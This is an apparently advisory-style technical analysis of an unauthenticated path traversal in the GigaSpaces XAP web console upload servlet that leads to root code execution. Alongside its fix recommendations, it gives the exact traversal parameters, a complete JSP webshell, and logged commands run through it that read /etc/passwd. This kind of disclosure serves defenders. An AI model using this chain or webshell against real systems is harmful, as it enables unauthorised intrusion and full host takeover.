# GigaSpaces XAP Unauthenticated Path Traversal to Root RCE - Technical Analysis

## 1. Overview

GigaSpaces InsightEdge Enterprise 16.1.1 (XAP In-Memory Data Grid) is an in-memory data grid and real-time analytics platform used by financial services and telecommunications for high-performance transaction caching and analytics. It ships a Web Management Console ("webui") that runs on port 8099 (Jetty 9.4.44, webapp at `tools/gs-webui/work/webapp/`). The `FileUploadServlet` (`com.gigaspaces.admin.webui.server.FileUploadServlet`) concatenates the request parameter `clientId` and the multipart field name (`item.getFieldName()`) directly into the file landing path with no sanitization or canonicalization (CWE-22 + CWE-434). Because `security enabled:false` is the default (CWE-306), the entire chain is unauthenticated. Writing a JSP webshell into the webapp root and triggering it over HTTP executes arbitrary commands as the webui process user, which defaults to `root`.

## 2. Vulnerability Summary

- **Root cause**: unsanitized `clientId` parameter + multipart field name concatenated into an upload path; no canonical path check
- **CWE**: CWE-22 (path traversal), CWE-434 (unrestricted upload), CWE-306 (missing authentication by default), CWE-78 (OS command execution via JSP)
- **CVSS 3.1**: 9.8 Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`
- **Impact**: unauthenticated arbitrary file write and root command execution on the management host and data grid

## 3. Authentication Boundary

`security.properties` ships with `security enabled:false`. The `SmartFilter$SpringSecurity` filter installs the Spring Security chain only when a security Spring profile is active:

```java
void init(FilterConfig filterConfig) {
    if (SpringUtils.isSecurityActive()) {   // default: no security profile -> false
        this.impl = new DelegatingFilterProxy("springSecurityFilterChain");
        this.impl.init(filterConfig);
    }
    // else impl = null
}
void doFilter(...) {
    if (this.impl != null) this.impl.doFilter(...);
    else chain.doFilter(...);               // default: pass-through, no auth
}
```

Dynamic verification confirmed all 15 RPC endpoints return 200 without credentials. The webapp root path `/shell.jsp` (context `/`) only passes through the gZipFilter and JSP servlet, not the Spring Security chain (which maps only to `/gs_webui/*`).

The filter/servlet mapping in `web.xml` is relevant to the exploit: `springSecurityFilterChain` maps only to `/gs_webui/*`; `gZipFilter` maps to `/*` (compression only); `i18nFilter` maps to `/Gs_webui.jsp` and `/`; the Spring `DispatcherServlet` maps to `*.do`; and `fileUploaderServlet` maps to `/gs_webui/rpc/fileUpload`. The uploaded JSP placed at the webapp root (`/shell.jsp`, context `/`) is served by the default servlet through only the gZipFilter — the Spring Security chain never sees it, so even if security were enabled, a JSP at the webapp root would still bypass the management-console authentication filter. This makes the vulnerability resilient to partial hardening.

## 4. Attack Surface

| Item | Value |
|---|---|
| Management port | 8099 (Jetty 9.4.44) |
| Vulnerable endpoint | `POST /gs_webui/rpc/fileUpload` (fileUploaderServlet) |
| Default security | `security enabled:false` |
| Process user | root (default) |

## 5. Sink Identification

`FileUploadServlet.doPost` (decompiled):

```java
public void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {
    File uploadClientDir;
    ServletFileUpload upload = new ServletFileUpload();
    String clientId = request.getParameter("clientId");   // user-controlled, unsanitized
    if (!(uploadClientDir = FileHelper.getWorkFile("uploaded", clientId)).exists()) {
        uploadClientDir.mkdirs();                          // mkdirs on traversal path
    }
    try {
        FileItemIterator iter = upload.getItemIterator(request);
        while (iter.hasNext()) {
            FileItemStream item = iter.next();
            String name = item.getFieldName();             // multipart field name, unsanitized
            InputStream is = item.openStream();
            File file = new File(uploadClientDir + File.separator + name);  // TRAVERSAL POINT
            FileOutputStream fos = new FileOutputStream(file);               // ARBITRARY WRITE
            byte[] buffer = new byte[4096];
            int len;
            while ((len = is.read(buffer, 0, buffer.length)) != -1) {
                fos.write(buffer, 0, len);
            }
            fos.flush(); fos.close(); is.close();
        }
    } catch (Exception e) { e.printStackTrace(); }
}
```

Two sinks: (1) `new File(uploadClientDir + File.separator + name)` where `clientId` carries `..` and the field name can contain `/` or `..`; (2) `new FileOutputStream(file)` for arbitrary file write. There is no `canonicalPath()` check, no extension allowlist, and no path prefix validation.

## 6. Source Identification

`FileHelper.getWorkFile("uploaded", clientId)` (decompiled):

```java
private static File getWorkDir() {
    String property = System.getProperty("com.gs.work");   // = <install>/work
    if (property != null && property.trim().length() > 0) return new File(property);
    return ...;
}
public static File getWorkFile(String ... folder) {
    File result = FileHelper.getWorkDir();
    for (String s : folder) { result = new File(result, s); }
    return result;   // no canonicalization
}
```

- Source 1: `request.getParameter("clientId")` -> `getWorkFile("uploaded", clientId)` -> `<workDir>/uploaded/<clientId>` — the `clientId` is unsanitized and can contain `..`
- Source 2: `item.getFieldName()` (multipart field name) -> file name — unsanitized, can contain `/` or `..`

Both sources are fully user-controlled; `getWorkFile` builds paths with `new File(parent, child)` and never canonicalizes.

## 7. Data Flow

```
request.getParameter("clientId")                       [Source 1, user-controlled]
  -> getWorkFile("uploaded", clientId)
     -> new File(<workDir>, "uploaded") -> new File(_, clientId)   [no canonicalize]
        -> uploadClientDir = <workDir>/uploaded/<clientId>         [contains ../]
           -> uploadClientDir.mkdirs()                             [mkdirs on traversal path]
              -> iter.next().getFieldName()                        [Source 2, user-controlled]
                 -> name = <field name>                            [can contain ../shell.jsp]
                    -> new File(uploadClientDir + "/" + name)      [Sink: traversal point]
                       -> new FileOutputStream(file)               [Sink: arbitrary write]
                          -> writes <webapp_root>/shell.jsp
```

Target path derivation: `workDir` = `<install>/work`; webapp root = `<install>/tools/gs-webui/work/webapp`. With `clientId=../../tools/gs-webui/work/webapp`, the path `<install>/work/uploaded/../../tools/gs-webui/work/webapp` resolves to the webapp root; `name=shell.jsp` lands at `<install>/tools/gs-webui/work/webapp/shell.jsp`.

## 8. Exploit Construction

Linux path resolution quirk (important): a direct traversal fails with `FileNotFoundException` because `work/uploaded` does not exist and `..` cannot step back from a directory that was never entered; `mkdirs()` on the traversal path does not create `work/uploaded`.

Workaround — two-step upload:

1. **Benign upload**: `clientId=benign` with any small file. The servlet runs `mkdirs()` on `work/uploaded/benign`, which also creates `work/uploaded`.
2. **Traversal upload**: `clientId=../../tools/gs-webui/work/webapp`, multipart field name `shell.jsp`, file part = JSP payload invoking `Runtime.exec()` on a `cmd` parameter.
3. `GET /shell.jsp?cmd=<command>` — the JSP servlet compiles and executes the JSP; command runs as the webui process (default root); output is returned in the HTTP response.

The JSP payload is a minimal command-execution webshell:

```jsp
<%@ page import="java.io.*" %><%
String cmd = request.getParameter("cmd");
if (cmd != null) {
  Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String line; while ((line=br.readLine())!=null) out.println(line);
}
%>
```

The multipart request uses `clientId=../../tools/gs-webui/work/webapp` and a field name of `shell.jsp`; the servlet writes the file part content to `<install>/tools/gs-webui/work/webapp/shell.jsp`. Because the JSP is placed in the webapp root and Jetty is configured with the JSP servlet, a subsequent GET compiles and executes it on the fly.

## 9. Dynamic Verification

Verified dynamically against GigaSpaces InsightEdge Enterprise 16.1.1:

```
Run 1: GET /shell.jsp?cmd=id
  -> uid=0(root) gid=0(root) groups=0(root)

Run 2: GET /shell.jsp?cmd=whoami;hostname;echo PROOF > /tmp/rce_proof_gigaspaces.txt;head -1 /etc/passwd
  -> root
  -> <hostname>
  -> root:x:0:0:root:/root:/bin/bash

Independent SSH marker read-back confirmed /tmp/rce_proof_gigaspaces.txt exists on the target.
```

## 10. Reachability & Impact

- **Default configuration**: reachable — `security enabled:false` is the default; the webui runs as root by default; port 8099 listens by default.
- **No authentication**: all RPC endpoints return 200 without credentials.
- **Impact**: unauthenticated root RCE on the management host; full control of the data grid management plane and any data visible to the webui process.

The Web Management Console is a central administrative surface for XAP deployments, typically used by operations teams to monitor and manage the in-memory data grid. Compromise of the console yields the ability to inspect grid configuration, access management APIs, and execute code on the host that runs the console. In production layouts the console is frequently bound to a management network rather than the public Internet, but the default binding listens on all interfaces, and the absence of authentication means any network path that reaches port 8099 is sufficient to exploit the chain.

## 11. Fix Recommendations

1. Enable security (`security enabled:true`) and require authentication on all management endpoints, including the upload servlet.
2. Canonicalize and validate every upload path against the intended base directory; reject paths containing `..` or escaping the upload root.
3. Run the Web Management Console as an unprivileged account instead of root.
4. Restrict the management port 8099 to trusted networks; place it behind an authenticated reverse proxy.

## 12. CWE / CVSS

- **CWE-22** — path traversal
- **CWE-434** — unrestricted file upload
- **CWE-306** — missing authentication by default
- **CWE-78** — OS command injection via JSP
- **CVSS 3.1**: **9.8 Critical** — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

The score assumes the default `security enabled:false` configuration and the default root execution context. If an operator enabled security but left the upload servlet outside the protected mapping, the traversal-to-webshell chain would still execute with the webui user's privileges, preserving the arbitrary-code-execution impact.
